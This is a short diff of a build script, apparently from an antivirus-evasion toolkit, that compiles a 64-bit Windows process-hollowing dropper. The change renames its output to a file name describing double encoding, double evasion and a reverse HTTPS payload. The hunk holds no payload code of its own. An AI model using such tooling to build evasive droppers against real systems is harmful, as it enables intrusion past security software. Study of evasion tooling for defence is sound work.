@@ -148,8 +148,8 @@ set_payload_execution_method hollowing64
 enable_debug_print to_file C:/users/public/dropper_log.txt
 
 # compile hollowing payload
-$win64_compiler -o output/output.exe source/avet.c -lws2_32
-strip output/output.exe
+$win64_compiler -o output/hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win64.exe source/avet.c -lws2_32
+strip output/hollowing_targetfromcmd_doubleenc_doubleev_revhttps_win64.exe
 printf "\n Generated dropper executable output/output.exe\n"
 
 # cleanup
